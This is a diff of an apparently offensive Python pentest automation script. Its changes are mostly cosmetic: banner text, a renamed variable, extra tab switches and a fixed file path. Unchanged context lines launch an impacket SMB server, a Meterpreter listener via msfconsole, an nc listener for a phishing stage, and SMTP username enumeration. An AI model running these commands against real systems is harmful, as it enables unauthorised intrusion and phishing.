@@ -775,7 +775,7 @@ banner3()
 time.sleep(2)
 
 command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'SMB Server'; xdotool key Return; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return; sleep 2")
 command("xdotool type 'cat banner.tmp'; xdotool key Return")
 command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
@@ -800,7 +800,7 @@ with open("meterpreter.rc", "w") as write:
    write.write("run\n")
 
 command("xdotool key Ctrl+Shift+T; sleep 2")
-command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER'; xdotool key Return; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return; sleep 2")
 command("xdotool type 'cat banner.tmp'; xdotool key Return")
 command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
@@ -2744,9 +2744,9 @@ while True:
          
       if checkParams != 1:
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
+         command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return; sleep 2")
          
-         with open("logo2.tmp", "a") as logo:
+         with open("logo2.tmp", "a") as banner:
             banner.write("  ____  ___    ____  _   _ ___ ____  _   _ ___ _   _  ____ \n")
             banner.write(" / ___|/ _ \  |  _ \| | | |_ _/ ___|| | | |_ _| \ | |/ ___|\n")
             banner.write("| |  _| | | | | |_) | |_| || |\___ \| |_| || ||  \| | |  _ \n")
@@ -2754,10 +2754,13 @@ while True:
             banner.write(" \____|\___/  |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|\n")
             banner.write("                                                           \n")
             banner.write("   BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)    \n")
-         logo.close()
+         banner.close()
          
          command("xdotool type 'cat logo2.tmp'; xdotool key Return")
          command("xdotool type 'nc -nvlp 80'; xdotool key Return")
+         command("xdotool key Ctrl+Shift+Tab")
+         command("xdotool key Ctrl+Shift+Tab") # extra screens open
+         command("xdotool key Ctrl+Shift+Tab")
          command("xdotool key Ctrl+Shift+Tab")
                  
          command('echo "Hello.\n" > body.tmp')
@@ -2780,7 +2783,7 @@ while True:
             print("")
             
          print("[" + colored("*", colour8) + "] Checking for valid usernames...")
-         command("smtp-user-enum -U usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
+         command("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
          command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")
          
          match = 0         
